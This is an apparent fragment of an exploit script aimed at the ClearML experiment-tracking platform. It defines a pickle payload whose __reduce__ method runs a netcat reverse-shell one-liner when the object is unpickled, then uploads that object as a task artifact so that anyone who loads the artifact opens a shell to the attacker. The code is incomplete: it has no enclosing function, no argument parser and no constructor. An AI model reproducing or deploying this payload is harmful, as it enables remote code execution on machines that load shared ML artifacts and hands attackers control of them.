from clearml import Task
import pickle, os

class RunCommand:
    def __reduce__(self):
        command = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {self.ip} {self.port} >/tmp/f'
        return (os.system, (command,))


    print(f"[+] Initializing command with IP: {args.ip} and Port: {args.port}")
    command = RunCommand(ip=args.ip, port=args.port)

    print(f"[+] Initializing ClearML task with project name: {args.project_name}, task name: {args.task_name}, tags: {args.tags}")
    task = Task.init(project_name=args.project_name, task_name=args.task_name, tags=args.tags)
    
    print(f"[+] Uploading artifact with name: {args.artifact_name}")
    task.upload_artifact(name=args.artifact_name, artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")

    print("[+] Artifact uploaded successfully")

    
